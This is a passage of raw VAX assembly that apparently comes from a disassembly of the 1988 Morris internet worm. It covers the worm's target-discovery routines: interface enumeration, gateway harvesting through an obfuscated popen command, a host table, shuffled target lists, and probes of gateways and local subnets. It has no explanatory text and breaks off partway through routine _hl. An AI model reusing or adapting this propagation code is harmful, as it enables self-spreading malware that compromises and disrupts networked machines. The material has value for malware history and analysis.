#### start of global routine "_if_init"	####
	.data
	.text
	.align	1
	.globl	 _if_init
_if_init:
	.word	S7
	.set	S7,0x0
	brw	LL0
LL26:
	clrf	_nifs	#  global sym _nifs#
	pushl	$0x0
	pushl	$0x1
	pushl	$0x2
	calls	$0x3,_socket	#  global routine _socket#
	movl	r0,-0x18C(fp)
	tstl	-0x18C(fp)
	bgeq	LL1
	clrf	r0
	ret
LL1:
	subl3	$0x188,fp,r0
	movl	r0,-0x4(fp)
	cvtwl	$0x180,-0x8(fp)
	subl3	$0x8,fp,r0
	pushl	r0
	pushl	$0xC0086914
	pushl	-0x18C(fp)
	calls	$0x3,_ioctl	#  global routine _ioctl#
	tstl	r0
	bgeq	LL2
	pushl	-0x18C(fp)
	calls	$0x1,_close	#  global routine _close#
	clrf	r0
	ret
LL2:
	divl3	$0x20,-0x8(fp),r0
	movl	r0,-0x194(fp)
	clrf	-0x190(fp)
LL23:
	cmpl	-0x190(fp),-0x194(fp)
	blss	LL3
	brw	LL4
LL3:
	clrf	-0x198(fp)
LL7:
	cmpl	-0x198(fp),_nifs	#  global sym _nifs#
	bgeq	LL5
	subl3	$0x188,fp,r0
	ashl	$0x5,-0x190(fp),r1
	addl2	r1,r0
	pushl	r0
	ashl	$0x5,-0x198(fp),r0
	addl2	$_ifs,r0	#  global sym _ifs#
	pushl	r0
	calls	$0x2,_strcmp	#  global routine _strcmp#
	tstl	r0
	bneq	LL6
	brb	LL5
LL6:
	incl	-0x198(fp)
	brb	LL7
LL5:
	cmpl	-0x198(fp),_nifs	#  global sym _nifs#
	bgeq	LL8
	brw	LL9
LL8:
	pushl	$0x20
	movl	_nifs,r0	#  global sym _nifs#
	ashl	$0x5,r0,r0
	subl2	$0x20,sp
	movc3	$0x20,_ifs,(sp)	#  global sym _ifs#
	calls	$0x9,_bzero	#  global routine _bzero#
	subl3	$0x188,fp,r0
	ashl	$0x5,-0x190(fp),r1
	addl2	r1,r0
	pushl	r0
	ashl	$0x5,_nifs,r0	#  global sym _nifs#
	addl2	$_ifs,r0	#  global sym _ifs#
	pushl	r0
	calls	$0x2,_strcpy	#  global routine _strcpy#
	subl3	$0x188,fp,r0
	ashl	$0x5,-0x190(fp),r1
	addl2	r1,r0
	pushl	r0
	subl3	$0x1B8,fp,r0
	pushl	r0
	calls	$0x2,_strcpy	#  global routine _strcpy#
	subl3	$0x1B8,fp,r0
	pushl	r0
	pushl	$0xC0206911
	pushl	-0x18C(fp)
	calls	$0x3,_ioctl	#  global routine _ioctl#
	tstl	r0
	bgeq	LL10
LL10:
	bitw	$0x1,-0x1A8(fp)
	bneq	LL11
	brw	LL9
LL11:
	bitw	$0x40,-0x1A8(fp)
	bneq	LL12
	brw	LL9
LL12:
	movl	_nifs,r0	#  global sym _nifs#
	ashl	$0x5,r0,r0
	movw	-0x1A8(fp),_ifs+0x1C	#  global data segment#
	subl3	$0x1B8,fp,r0
	pushl	r0
	pushl	$0xC020690D
	pushl	-0x18C(fp)
	calls	$0x3,_ioctl	#  global routine _ioctl#
	tstl	r0
	bgeq	LL13
LL13:
	pushl	$0x10
	subl3	$0x1CC,fp,r0
	pushl	r0
	subl3	$0x1A8,fp,r0
	pushl	r0
	calls	$0x3,_bcopy	#  global routine _bcopy#
	cmpw	-0x1CC(fp),$0x2
	beql	LL14
	brw	LL9
LL14:
	pushl	$mcount+0x2C	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	calls	$0x1,_inet_addr	#  global routine _inet_addr#
	movl	r0,-0x1D0(fp)
	cmpl	-0x1C8(fp),-0x1D0(fp)
	bneq	LL15
	brw	LL9
LL15:
	movl	_nifs,r0	#  global sym _nifs#
	ashl	$0x5,r0,r0
	movl	-0x1C8(fp),_ifs+0x10	#  global data segment#
	movl	_nifs,r0	#  global sym _nifs#
	ashl	$0x5,r0,r0
	bitw	$0x10,_ifs+0x1C	#  global data segment#
	beql	LL16
	subl3	$0x1B8,fp,r0
	pushl	r0
	pushl	$0xC020690F
	pushl	-0x18C(fp)
	calls	$0x3,_ioctl	#  global routine _ioctl#
	tstl	r0
	bgeq	LL17
LL17:
	pushl	$0x10
	subl3	$0x1CC,fp,r0
	pushl	r0
	subl3	$0x1A8,fp,r0
	pushl	r0
	calls	$0x3,_bcopy	#  global routine _bcopy#
	movl	_nifs,r0	#  global sym _nifs#
	ashl	$0x5,r0,r0
	movl	-0x1C8(fp),_ifs+0x14	#  global data segment#
LL16:
	movl	_nifs,r0	#  global sym _nifs#
	ashl	$0x5,r0,r0
	pushl	_ifs+0x10	#  global data segment#
	calls	$0x1,_def_netmask	#  global routine _def_netmask#
	movl	r0,-0x1BC(fp)
	movl	_nifs,r0	#  global sym _nifs#
	ashl	$0x5,r0,r0
	movl	-0x1BC(fp),_ifs+0x18	#  global data segment#
	subl3	$0x1B8,fp,r0
	pushl	r0
	pushl	$0xC0206915
	pushl	-0x18C(fp)
	calls	$0x3,_ioctl	#  global routine _ioctl#
	tstl	r0
	bgeq	LL18
	brb	LL19
LL18:
	pushl	$0x10
	subl3	$0x1CC,fp,r0
	pushl	r0
	subl3	$0x1A8,fp,r0
	pushl	r0
	calls	$0x3,_bcopy	#  global routine _bcopy#
	movl	_nifs,r0	#  global sym _nifs#
	ashl	$0x5,r0,r0
	movl	-0x1C8(fp),_ifs+0x18	#  global data segment#
LL19:
	movl	_nifs,r0	#  global sym _nifs#
	ashl	$0x5,r0,r0
	movl	_ifs+0x18,r0	#  global data segment#
	mcoml	r0,r0
	bicl3	r0,-0x1BC(fp),r0
	cmpl	r0,-0x1BC(fp)
	beql	LL20
	movl	_nifs,r0	#  global sym _nifs#
	ashl	$0x5,r0,r0
	movl	-0x1BC(fp),_ifs+0x18	#  global data segment#
LL20:
	tstl	_me	#  global sym _me#
	bneq	LL21
	pushl	$0x1
	movl	_nifs,r0	#  global sym _nifs#
	ashl	$0x5,r0,r0
	pushl	_ifs+0x10	#  global data segment#
	calls	$0x2,_h_addr2host	#  global routine _h_addr2host#
	movl	r0,_me	#  global sym _me#
	brb	LL22
LL21:
	movl	_nifs,r0	#  global sym _nifs#
	ashl	$0x5,r0,r0
	pushl	_ifs+0x10	#  global data segment#
	pushl	_me	#  global sym _me#
	calls	$0x2,_h_addaddr	#  global routine _h_addaddr#
LL22:
	incl	_nifs	#  global sym _nifs#
LL9:
	incl	-0x190(fp)
	brw	LL23
LL4:
	tstl	_nifs	#  global sym _nifs#
	bleq	LL24
	movl	$0x1,r0
	brb	LL25
LL24:
	clrf	r0
LL25:
	ret
	ret
LL0:
	movab	-0x1D0(sp),sp
	brw	LL26
	halt
####  END PROC ####

#### start of global routine "_def_netmask" ####
	.data
	.text
	.align	1
	.globl	 _def_netmask
_def_netmask:
	.word	S9
	.set	S9,0x0
	brb	LL0
LL3:
	bitl	$0x80000000,0x4(ap)
	bneq	LL1
	pushl	$0xFF000000
	calls	$0x1,_htonl	#  global routine _htonl#
	ret
LL1:
	bicl3	$0x3FFFFFFF,0x4(ap),r0
	cmpl	r0,$0x80000000
	bneq	LL2
	pushl	$-0x10000
	calls	$0x1,_htonl	#  global routine _htonl#
	ret
LL2:
	pushl	$-0x100
	calls	$0x1,_htonl	#  global routine _htonl#
	ret
	ret
LL0:
	brb	LL3
	halt
####  END PROC ####

#### start of global routine "_netmaskfor" ####
	.data
	.text
	.align	1
	.globl	 _netmaskfor
_netmaskfor:
	.word	S11
	.set	S11,0x0
	brb	LL0
LL4:
	pushl	0x4(ap)
	calls	$0x1,_def_netmask	#  global routine _def_netmask#
	movl	r0,-0x8(fp)
	clrf	-0x4(fp)
LL3:
	cmpl	-0x4(fp),_nifs	#  global sym _nifs#
	bgeq	LL1
	mcoml	-0x8(fp),r0
	bicl3	r0,0x4(ap),r0
	movl	-0x4(fp),r1
	ashl	$0x5,r1,r1
	mcoml	-0x8(fp),r2
	bicl3	r2,_ifs+0x10,r1	#  global data segment#
	cmpl	r0,r1
	bneq	LL2
	movl	-0x4(fp),r0
	ashl	$0x5,r0,r0
	movl	_ifs+0x18,r0	#  global data segment#
	ret
LL2:
	incl	-0x4(fp)
	brb	LL3
LL1:
	movl	-0x8(fp),r0
	ret
	ret
LL0:
	subl2	$0x8,sp
	brb	LL4
	halt
####  END PROC ####

#### start of global routine "_rt_init"	####
	.data
	.text
	.align	1
	.globl	 _rt_init
_rt_init:
	.word	S13
	.set	S13,0x0
	brw	LL0
LL19:
	clrf	_ngateways	#  global sym _ngateways#
	pushl	$mcount+0x4D	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	$mcount+0x36	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	calls	$0x2,_popen	#  global routine _popen#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bneq	LL1
	clrf	r0
	ret
LL1:
	pushl	-0x4(fp)
	pushl	$0x64
	subl3	$0x68,fp,r0
	pushl	r0
	calls	$0x3,_fgets	#  global routine _fgets#
	tstl	r0
	bneq	LL2
	brw	LL3
LL2:
	pushl	$0x0
	calls	$0x1,_other_sleep	#  global routine _other_sleep#
	cmpl	_ngateways,$0x1F4	#  global sym _ngateways#
	blss	LL4
	brw	LL3
LL4:
	subl3	$0x130,fp,r0
	pushl	r0
	subl3	$0xCC,fp,r0
	pushl	r0
	pushl	$mcount+0x4F	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x68,fp,r0
	pushl	r0
	calls	$0x4,_sscanf	#  global routine _sscanf#
	cmpl	r0,$0x2
	beql	LL5
	brb	LL1
LL5:
	pushl	$mcount+0x54	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0xCC,fp,r0
	pushl	r0
	calls	$0x2,_strcmp	#  global routine _strcmp#
	tstl	r0
	bneq	LL6
	pushl	$mcount+0x5C	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0xCC,fp,r0
	pushl	r0
	calls	$0x2,_strcpy	#  global routine _strcpy#
LL6:
	cvtbl	-0xCC(fp),r0
	bitb	$0x4,__ctype_+0x1[r0]	#  global data segment#
	beql	LL7
	cvtbl	-0x130(fp),r0
	bitb	$0x4,__ctype_+0x1[r0]	#  global data segment#
	bneq	LL8
LL7:
	brw	LL1
LL8:
	subl3	$0x130,fp,r0
	pushl	r0
	calls	$0x1,_inet_addr	#  global routine _inet_addr#
	movl	r0,-0x134(fp)
	cmpl	-0x134(fp),$-0x1
	bneq	LL9
	brw	LL1
LL9:
	pushl	$mcount+0x64	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	calls	$0x1,_inet_addr	#  global routine _inet_addr#
	movl	r0,-0x13C(fp)
	cmpl	-0x134(fp),-0x13C(fp)
	bneq	LL10
	brw	LL1
LL10:
	clrf	-0x138(fp)
LL13:
	cmpl	-0x138(fp),_ngateways	#  global sym _ngateways#
	bgeq	LL11
	movl	-0x138(fp),r0
	cmpl	_gateways[r0],-0x134(fp)	#  global sym _gateways#
	bneq	LL12
	brb	LL11
LL12:
	incl	-0x138(fp)
	brb	LL13
LL11:
	cmpl	-0x138(fp),_ngateways	#  global sym _ngateways#
	bgeq	LL14
	brw	LL1
LL14:
	clrf	-0x138(fp)
LL17:
	cmpl	-0x138(fp),_nifs	#  global sym _nifs#
	bgeq	LL15
	movl	-0x138(fp),r0
	ashl	$0x5,r0,r0
	cmpl	-0x134(fp),_ifs+0x10	#  global data segment#
	bneq	LL16
	brb	LL15
LL16:
	incl	-0x138(fp)
	brb	LL17
LL15:
	cmpl	-0x138(fp),_nifs	#  global sym _nifs#
	bgeq	LL18
	brw	LL1
LL18:
	movl	_ngateways,r0	#  global sym _ngateways#
	movl	-0x134(fp),_gateways[r0]	#  global sym _gateways#
	incl	_ngateways	#  global sym _ngateways#
	brw	LL1
LL3:
	pushl	-0x4(fp)
	calls	$0x1,_pclose	#  global routine _pclose#
	calls	$0x0,0xACA
	movl	$0x1,r0
	ret
	ret
LL0:
	movab	-0x13C(sp),sp
	brw	LL19
	halt
	halt
	brw	LL20
LL40:
	pushl	$0x4
	pushl	_ngateways	#  global sym _ngateways#
	pushl	$_gateways	#  global sym _gateways#
	calls	$0x3,_permute	#  global routine _permute#
	pushl	$0x1
	calls	$0x1,_sethostent	#  global routine _sethostent#
	clrf	-0xC(fp)
LL29:
	cmpl	-0xC(fp),_ngateways	#  global sym _ngateways#
	blss	LL21
LL23:
	brw	LL22
LL21:
	cmpl	-0xC(fp),$0x14
	bgeq	LL23
	pushl	$0x0
	calls	$0x1,_other_sleep	#  global routine _other_sleep#
	pushl	$0x1
	movl	-0xC(fp),r0
	pushl	_gateways[r0]	#  global sym _gateways#
	calls	$0x2,_h_addr2host	#  global routine _h_addr2host#
	movl	r0,-0x8(fp)
	movl	-0x8(fp),r0
	bisl2	$0x1,0x48(r0)
	pushl	$0x2
	pushl	$0x4
	ashl	$0x2,-0xC(fp),r0
	addl2	$_gateways,r0	#  global sym _gateways#
	pushl	r0
	calls	$0x3,_gethostbyaddr	#  global routine _gethostbyaddr#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bneq	LL24
	brw	LL25
LL24:
	pushl	$0x4
	subl3	$0x1C,fp,r0
	pushl	r0
	movl	-0x4(fp),r0
	pushl	*0x10(r0)
	calls	$0x3,_bcopy	#  global routine _bcopy#
	pushl	-0x1C(fp)
	pushl	-0x8(fp)
	calls	$0x2,_h_addaddr	#  global routine _h_addaddr#
	pushl	*-0x4(fp)
	pushl	-0x8(fp)
	calls	$0x2,_h_addname	#  global routine _h_addname#
	clrf	-0x10(fp)
LL27:
	movl	-0x10(fp),r0
	movl	-0x4(fp),r1
	ashl	$0x2,r0,r0
	addl3	r0,0x4(r1),r0
	tstl	(r0)
	beql	LL26
	movl	-0x10(fp),r0
	movl	-0x4(fp),r1
	ashl	$0x2,r0,r0
	addl3	r0,0x4(r1),r0
	pushl	(r0)
	pushl	-0x8(fp)
	calls	$0x2,_h_addname	#  global routine _h_addname#
	incl	-0x10(fp)
	brb	LL27
LL26:
	pushl	*-0x4(fp)
	calls	$0x1,_gethostbyname	#  global routine _gethostbyname#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	beql	LL25
	clrf	-0x10(fp)
LL28:
	movl	-0x10(fp),r0
	movl	-0x4(fp),r1
	ashl	$0x2,r0,r0
	addl3	r0,0x10(r1),r0
	tstl	(r0)
	beql	LL25
	pushl	$0x4
	subl3	$0x1C,fp,r0
	pushl	r0
	movl	-0x10(fp),r0
	movl	-0x4(fp),r1
	ashl	$0x2,r0,r0
	addl3	r0,0x10(r1),r0
	pushl	(r0)
	calls	$0x3,_bcopy	#  global routine _bcopy#
	pushl	-0x1C(fp)
	pushl	-0x8(fp)
	calls	$0x2,_h_addaddr	#  global routine _h_addaddr#
	incl	-0x10(fp)
	brb	LL28
LL25:
	incl	-0xC(fp)
	brw	LL29
LL22:
	clrf	-0xC(fp)
LL39:
	cmpl	-0xC(fp),_ngateways	#  global sym _ngateways#
	blss	LL30
LL32:
	brw	LL31
LL30:
	cmpl	-0xC(fp),$0x14
	bgeq	LL32
	pushl	$0x0
	calls	$0x1,_other_sleep	#  global routine _other_sleep#
	pushl	$0x1
	movl	-0xC(fp),r0
	pushl	_gateways[r0]	#  global sym _gateways#
	calls	$0x2,_h_addr2host	#  global routine _h_addr2host#
	movl	r0,-0x8(fp)
	clrf	-0x10(fp)
LL38:
	cmpl	-0x10(fp),$0xC
	bgeq	LL33
	movl	-0x10(fp),r0
	tstl	*-0x8(fp)[r0]
	bneq	LL34
	brb	LL33
LL34:
	movl	-0x10(fp),r0
	pushl	*-0x8(fp)[r0]
	calls	$0x1,_gethostbyname	#  global routine _gethostbyname#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bneq	LL35
	brb	LL36
LL35:
	clrf	-0x18(fp)
LL37:
	movl	-0x18(fp),r0
	movl	-0x4(fp),r1
	ashl	$0x2,r0,r0
	addl3	r0,0x10(r1),r0
	tstl	(r0)
	beql	LL36
	pushl	$0x4
	subl3	$0x1C,fp,r0
	pushl	r0
	movl	-0x18(fp),r0
	movl	-0x4(fp),r1
	ashl	$0x2,r0,r0
	addl3	r0,0x10(r1),r0
	pushl	(r0)
	calls	$0x3,_bcopy	#  global routine _bcopy#
	pushl	-0x1C(fp)
	pushl	-0x8(fp)
	calls	$0x2,_h_addaddr	#  global routine _h_addaddr#
	incl	-0x18(fp)
	brb	LL37
LL36:
	incl	-0x10(fp)
	brb	LL38
LL33:
	incl	-0xC(fp)
	brw	LL39
LL31:
	calls	$0x0,_endhostent	#  global routine _endhostent#
	ret
LL20:
	subl2	$0x1C,sp
	brw	LL40
	halt
####  END PROC ####

#### start of global routine "_getaddrs" ####
	.data
	.text
	.align	1
	.globl	 _getaddrs
_getaddrs:
	.word	S15
	.set	S15,0x0
	brw	LL0
LL12:
	tstl	*0x4(ap)
	bneq	LL1
	movl	0x4(ap),r0
	tstl	0x30(r0)
	beql	LL1
	pushl	$0x2
	pushl	$0x4
	addl3	$0x30,0x4(ap),r0
	pushl	r0
	calls	$0x3,_gethostbyaddr	#  global routine _gethostbyaddr#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	beql	LL1
	pushl	*-0x4(fp)
	pushl	0x4(ap)
	calls	$0x2,_h_addname	#  global routine _h_addname#
LL1:
	tstl	*0x4(ap)
	bneq	LL2
	clrf	r0
	ret
LL2:
	clrf	-0x8(fp)
LL10:
	movl	-0x8(fp),r0
	tstl	*0x4(ap)[r0]
	bneq	LL3
	brw	LL4
LL3:
	movl	-0x8(fp),r0
	pushl	*0x4(ap)[r0]
	calls	$0x1,_gethostbyname	#  global routine _gethostbyname#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bneq	LL5
	brw	LL6
LL5:
	pushl	$0x4
	subl3	$0x10,fp,r0
	pushl	r0
	movl	-0x4(fp),r0
	pushl	*0x10(r0)
	calls	$0x3,_bcopy	#  global routine _bcopy#
	pushl	-0x10(fp)
	pushl	0x4(ap)
	calls	$0x2,_h_addaddr	#  global routine _h_addaddr#
	pushl	*-0x4(fp)
	pushl	0x4(ap)
	calls	$0x2,_h_addname	#  global routine _h_addname#
	clrf	-0xC(fp)
LL8:
	movl	-0xC(fp),r0
	movl	-0x4(fp),r1
	ashl	$0x2,r0,r0
	addl3	r0,0x4(r1),r0
	tstl	(r0)
	beql	LL7
	movl	-0xC(fp),r0
	movl	-0x4(fp),r1
	ashl	$0x2,r0,r0
	addl3	r0,0x4(r1),r0
	pushl	(r0)
	pushl	0x4(ap)
	calls	$0x2,_h_addname	#  global routine _h_addname#
	incl	-0xC(fp)
	brb	LL8
LL7:
	clrf	-0xC(fp)
LL9:
	movl	-0xC(fp),r0
	movl	-0x4(fp),r1
	ashl	$0x2,r0,r0
	addl3	r0,0x10(r1),r0
	tstl	(r0)
	beql	LL6
	pushl	$0x4
	subl3	$0x10,fp,r0
	pushl	r0
	movl	-0xC(fp),r0
	movl	-0x4(fp),r1
	ashl	$0x2,r0,r0
	addl3	r0,0x10(r1),r0
	pushl	(r0)
	calls	$0x3,_bcopy	#  global routine _bcopy#
	pushl	-0x10(fp)
	pushl	0x4(ap)
	calls	$0x2,_h_addaddr	#  global routine _h_addaddr#
	incl	-0xC(fp)
	brb	LL9
LL6:
	incl	-0x8(fp)
	brw	LL10
LL4:
	tstl	*0x4(ap)
	beql	LL11
	movl	$0x1,r0
	ret
LL11:
	clrf	r0
	ret
	ret
LL0:
	subl2	$0x10,sp
	brw	LL12
	halt
####  END PROC ####

#### start of global routine "_a2in" ####
	.data
	.text
	.align	1
	.globl	 _a2in
_a2in:
	.word	S17
	.set	S17,0x0
	brb	LL0
LL2:
	movl	0x4(ap),-0x4(fp)
	subl3	$0x4,fp,r0
	brb	LL1
LL1:
	movab	_h_errno+0x280C,r1	#  global bss segment#
	movl	(r0),(r1)
	movab	_h_errno+0x280C,r0	#  global bss segment#
	ret
LL0:
	subl2	$0x4,sp
	brb	LL2
####  END PROC ####

#### start of global routine "_h_addr2host" ####
	.data
	.text
	.align	1
	.globl	 _h_addr2host
_h_addr2host:
	.word	S19
	.set	S19,0x0
	brw	LL0
LL7:
	movl	_hosts,-0x8(fp)	#  global sym _hosts#
LL5:
	tstl	-0x8(fp)
	beql	LL1
	clrf	-0x4(fp)
LL4:
	cmpl	-0x4(fp),$0x6
	bgeq	LL2
	movl	-0x4(fp),r0
	addl3	$0x30,-0x8(fp),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	tstl	(r1)
	beql	LL3
	movl	-0x4(fp),r0
	addl3	$0x30,-0x8(fp),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	cmpl	0x4(ap),(r1)
	bneq	LL3
	movl	-0x8(fp),r0
	ret
LL3:
	incl	-0x4(fp)
	brb	LL4
LL2:
	movl	-0x8(fp),r0
	movl	0x4C(r0),-0x8(fp)
	brb	LL5
LL1:
	tstl	0x8(ap)
	beql	LL6
	pushl	$0x50
	calls	$0x1,_malloc	#  global routine _malloc#
	movl	r0,-0x8(fp)
	pushl	$0x50
	pushl	-0x8(fp)
	calls	$0x2,_bzero	#  global routine _bzero#
	movl	-0x8(fp),r0
	movl	0x4(ap),0x30(r0)
	movl	-0x8(fp),r0
	movl	_hosts,0x4C(r0)	#  global sym _hosts#
	movl	-0x8(fp),_hosts	#  global sym _hosts#
	movl	-0x8(fp),r0
	ret
LL6:
	clrf	r0
	ret
	ret
LL0:
	subl2	$0x8,sp
	brw	LL7
####  END PROC ####

#### start of global routine "_h_name2host" ####
	.data
	.text
	.align	1
	.globl	 _h_name2host
_h_name2host:
	.word	S21
	.set	S21,0x0
	brw	LL0
LL7:
	movl	_hosts,-0x8(fp)	#  global sym _hosts#
LL5:
	tstl	-0x8(fp)
	beql	LL1
	clrf	-0x4(fp)
LL4:
	cmpl	-0x4(fp),$0xC
	bgeq	LL2
	movl	-0x4(fp),r0
	tstl	*-0x8(fp)[r0]
	beql	LL3
	movl	-0x4(fp),r0
	pushl	*-0x8(fp)[r0]
	pushl	0x4(ap)
	calls	$0x2,_strcmp	#  global routine _strcmp#
	tstl	r0
	bneq	LL3
	movl	-0x8(fp),r0
	ret
LL3:
	incl	-0x4(fp)
	brb	LL4
LL2:
	movl	-0x8(fp),r0
	movl	0x4C(r0),-0x8(fp)
	brb	LL5
LL1:
	tstl	0x8(ap)
	beql	LL6
	pushl	$0x50
	calls	$0x1,_malloc	#  global routine _malloc#
	movl	r0,-0x8(fp)
	pushl	$0x50
	pushl	-0x8(fp)
	calls	$0x2,_bzero	#  global routine _bzero#
	pushl	0x4(ap)
	pushl	0x4(ap)
	calls	$0x1,_strlen	#  global routine _strlen#
	incl	r0
	pushl	r0
	calls	$0x1,_malloc	#  global routine _malloc#
	pushl	r0
	calls	$0x2,_strcpy	#  global routine _strcpy#
	movl	r0,*-0x8(fp)
	movl	-0x8(fp),r0
	movl	_hosts,0x4C(r0)	#  global sym _hosts#
	movl	-0x8(fp),_hosts	#  global sym _hosts#
	movl	-0x8(fp),r0
	ret
LL6:
	clrf	r0
	ret
	ret
LL0:
	subl2	$0x8,sp
	brw	LL7
####  END PROC ####

#### start of global routine "_h_addaddr" ####
	.data
	.text
	.align	1
	.globl	 _h_addaddr
_h_addaddr:
	.word	S23
	.set	S23,0x0
	brb	LL0
LL5:
	clrf	-0x4(fp)
LL4:
	cmpl	-0x4(fp),$0x6
	bgeq	LL1
	movl	-0x4(fp),r0
	addl3	$0x30,0x4(ap),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	cmpl	(r1),0x8(ap)
	bneq	LL2
	brb	LL1
LL2:
	movl	-0x4(fp),r0
	addl3	$0x30,0x4(ap),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	tstl	(r1)
	bneq	LL3
	movl	-0x4(fp),r0
	addl3	$0x30,0x4(ap),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	movl	0x8(ap),(r1)
	brb	LL1
LL3:
	incl	-0x4(fp)
	brb	LL4
LL1:
	ret
LL0:
	subl2	$0x8,sp
	brb	LL5
####  END PROC ####

#### start of global routine "_h_addname" ####
	.data
	.text
	.align	1
	.globl	 _h_addname
_h_addname:
	.word	S25
	.set	S25,0x0
	brb	LL0
LL5:
	clrf	-0x4(fp)
LL4:
	cmpl	-0x4(fp),$0xC
	bgeq	LL1
	movl	-0x4(fp),r0
	tstl	*0x4(ap)[r0]
	bneq	LL2
	pushl	0x8(ap)
	pushl	0x8(ap)
	calls	$0x1,_strlen	#  global routine _strlen#
	incl	r0
	pushl	r0
	calls	$0x1,_malloc	#  global routine _malloc#
	pushl	r0
	calls	$0x2,_strcpy	#  global routine _strcpy#
	movl	-0x4(fp),r1
	movl	r0,*0x4(ap)[r1]
	brb	LL1
LL2:
	movl	-0x4(fp),r0
	pushl	*0x4(ap)[r0]
	pushl	0x8(ap)
	calls	$0x2,_strcmp	#  global routine _strcmp#
	tstl	r0
	bneq	LL3
	brb	LL1
LL3:
	incl	-0x4(fp)
	brb	LL4
LL1:
	ret
LL0:
	subl2	$0x4,sp
	brb	LL5
####  END PROC ####

#### start of global routine "_h_clean"	####
	.data
	.text
	.align	1
	.globl	 _h_clean
_h_clean:
	.word	S27
	.set	S27,0x0
	brb	LL0
LL6:
	clrf	-0x4(fp)
	movl	_hosts,-0x8(fp)	#  global sym _hosts#
LL5:
	tstl	-0x8(fp)
	beql	LL1
	movl	-0x8(fp),r0
	movl	0x4C(r0),-0xC(fp)
	movl	-0x8(fp),r0
	bicl2	$0x6,0x48(r0)
	cmpl	-0x8(fp),_me	#  global sym _me#
	beql	LL2
	movl	-0x8(fp),r0
	tstl	0x48(r0)
	beql	LL3
LL2:
	movl	-0x8(fp),r0
	movl	-0x4(fp),0x4C(r0)
	movl	-0x8(fp),-0x4(fp)
	brb	LL4
LL3:
	pushl	-0x8(fp)
	calls	$0x1,_free	#  global routine _free#
LL4:
	movl	-0xC(fp),-0x8(fp)
	brb	LL5
LL1:
	movl	-0x4(fp),_hosts	#  global sym _hosts#
	ret
LL0:
	subl2	$0xC,sp
	brb	LL6
	halt
	halt
	halt
####  END PROC ####

#### start of global routine "_hg" ####
	.data
	.text
	.align	1
	.globl	 _hg
_hg:
	.word	S29
	.set	S29,0x0
	brb	LL0
LL4:
	calls	$0x0,_rt_init	#  global routine _rt_init#
	clrf	-0x8(fp)
LL3:
	cmpl	-0x8(fp),_ngateways	#  global sym _ngateways#
	bgeq	LL1
	pushl	$0x1
	movl	-0x8(fp),r0
	pushl	_gateways[r0]	#  global sym _gateways#
	calls	$0x2,_h_addr2host	#  global routine _h_addr2host#
	movl	r0,-0x4(fp)
	pushl	-0x4(fp)
	calls	$0x1,0x1638
	tstl	r0
	beql	LL2
	movl	$0x1,r0
	ret
LL2:
	incl	-0x8(fp)
	brb	LL3
LL1:
	clrf	r0
	ret
	ret
LL0:
	subl2	$0x8,sp
	brb	LL4
####  END PROC ####

#### start of global routine "_ha" ####
	.data
	.text
	.align	1
	.globl	 _ha
_ha:
	.word	S31
	.set	S31,0x0
	brw	LL0
LL10:
	cmpl	_ngateways,$0x1	#  global sym _ngateways#
	bgeq	LL1
	calls	$0x0,_rt_init	#  global routine _rt_init#
LL1:
	clrf	-0xC(fp)
	clrf	-0x8(fp)
LL6:
	cmpl	-0x8(fp),_ngateways	#  global sym _ngateways#
	bgeq	LL2
	pushl	$0x1
	movl	-0x8(fp),r0
	pushl	_gateways[r0]	#  global sym _gateways#
	calls	$0x2,_h_addr2host	#  global routine _h_addr2host#
	movl	r0,-0x4(fp)
	clrf	-0x10(fp)
LL5:
	cmpl	-0x10(fp),$0x6
	bgeq	LL3
	movl	-0x10(fp),r0
	addl3	$0x30,-0x4(fp),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	tstl	(r1)
	beql	LL4
	movl	-0x10(fp),r0
	addl3	$0x30,-0x4(fp),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	pushl	(r1)
	calls	$0x1,0x1586
	tstl	r0
	beql	LL4
	movl	-0x10(fp),r0
	addl3	$0x30,-0x4(fp),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	movl	-0xC(fp),r0
	movl	(r1),-0x1A0(fp)[r0]
	incl	-0xC(fp)
LL4:
	incl	-0x10(fp)
	brb	LL5
LL3:
	incl	-0x8(fp)
	brw	LL6
LL2:
	pushl	$0x4
	pushl	-0xC(fp)
	subl3	$0x1A0,fp,r0
	pushl	r0
	calls	$0x3,_permute	#  global routine _permute#
	clrf	-0x8(fp)
LL9:
	cmpl	-0x8(fp),-0xC(fp)
	bgeq	LL7
	movl	-0x8(fp),r0
	pushl	-0x1A0(fp)[r0]
	calls	$0x1,_netmaskfor	#  global routine _netmaskfor#
	mcoml	r0,r0
	movl	r0,-0x1A4(fp)
	movl	-0x8(fp),r0
	bicl3	-0x1A4(fp),-0x1A0(fp)[r0],r0
	pushl	r0
	calls	$0x1,0x12FC
	tstl	r0
	beql	LL8
	movl	$0x1,r0
	ret
LL8:
	incl	-0x8(fp)
	brb	LL9
LL7:
	clrf	r0
	ret
	ret
LL0:
	movab	-0x1A4(sp),sp
	brw	LL10
####  END PROC ####

#### start of global routine "_hl" ####
	.data
	.text
	.align	1
	.globl	 _hl
_hl:
	.word	S33
	.set	S33,0x0
	brb	LL0
LL5:
	clrf	-0x4(fp)
LL4:
	cmpl	-0x4(fp),$0x6
	bgeq	LL1
	movl	-0x4(fp),r0
	addl3	$0x30,_me,r1	#  global sym _me#
	ashl	$0x2,r0,r0
	addl2	r0,r1
	tstl	(r1)
	bneq	LL2
	brb	LL1
LL2:
